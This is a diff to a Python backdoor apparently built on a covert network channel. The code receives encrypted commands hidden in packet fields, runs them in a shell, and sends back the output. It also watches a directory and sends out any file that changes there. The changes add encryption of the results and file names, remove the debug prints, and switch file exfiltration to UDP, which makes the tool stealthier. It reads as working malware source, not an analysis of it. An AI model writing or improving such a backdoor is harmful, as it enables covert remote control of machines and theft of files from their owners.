@@ -8,6 +8,7 @@ import subprocess
 import binascii
 import pyinotify
 import parseConfig
+import time
 
 # Inputs
 localIP = parseConfig.localIP
@@ -17,7 +18,7 @@ dstPort = parseConfig.dstPort
 key = parseConfig.key
 IV = parseConfig.IV
 authentication = parseConfig.authentication
-global clientIP
+clientIP = parseConfig.clientIP
 monitorDir = parseConfig.monitorDir
 messages = []
 
@@ -72,18 +73,16 @@ def handle(packet):
                 if(checkCommands(UID)):
                     #DEBUG: print "Max reached, reconstruct command"
                     command = reconstructCommand(UID)
-                    print "Command reconstructed is " + command
                     command = decrypt(command)
-                    print str(len(command))
                     #decryptedCommand = decrypt(command)
-                    print "COMMAND: " + command
                     # print "DECRYPT " + decryptedCommand
                     #Delete that command from the list
                     deleteCommand(UID)
                     result = runCommand(command)
+                    encryptedResult = encrypt(result)
                     #print "Result is " + result
                     #threaad.sleep(5)
-                    sendmessage("TCP",result,"command")
+                    sendmessage("TCP",encryptedResult,"command")
                     #Run the command
                 # else:
                     #DEBUG: print "Max not reached, don't reconstruct command yet"
@@ -100,11 +99,15 @@ def lengthChecker(type,field):
             covertContent = bin(field)[2:].zfill(24)
         elif len(seqContent) > 24 and len(seqContent) < 32:
             covertContent = bin(field)[2:].zfill(32)
+        else:
+            return seqContent
     elif(type == "UDP"):
         if len(seqContent) < 8:
             covertContent = bin(field)[2:].zfill(8)
         elif len(seqContent) > 8 and len(seqContent) < 16:
             covertContent = bin(field)[2:].zfill(16)
+        else:
+            return seqContent
     return covertContent
 
 def authenticate(packet):
@@ -330,18 +333,17 @@ def sendmessage(protocol,message,type):
         send((packet))
         pass
 
+
 def runCommand(command):
     command = command.replace("\0", '')
     f = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     result = f.stdout.read() + f.stderr.read()
     if result == "":
         result = "ERROR or No Output Produced"
-    #print "Output is " + result
     return result
 
 ##HELPERS
 def decrypt(command):
-    print "Decrypt Cipher Text " + command
     decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
     plain = decryptor.decrypt(command)
     return plain
@@ -366,14 +368,14 @@ def messageToBits(message):
 
 def fileToBits(filePath):
     # fileName = str.split("/")
-    print "File path is " + filePath
     file = open(filePath, "rb")
     binaryString = ""
 
     #convert whatever is in the file into bytes
     readFile = bytearray(file.read())
+    #Encrypt with CBC
     fileName = filePath.split("/")
-    fileName = fileName[len(fileName) - 1]
+    fileName = encrypt(fileName[len(fileName) - 1])
     #craft a header
     header = messageToBits(fileName + "\n");
 
@@ -384,6 +386,8 @@ def fileToBits(filePath):
     for bit in readFile:
         binaryString += bin(bit)[2:].zfill(8)
     return binaryString
+
+
 
 
 ##############################################################################################################
@@ -399,7 +403,7 @@ def change(ev):
     fileName = ev.name
     filePath = ev.pathname
     if os.path.isfile(filePath) == True:
-        sendmessage("TCP", filePath, "file")
+        sendmessage("UDP", filePath, "file")
     elif os.path.isdir(filePath) == True:
         pass
 
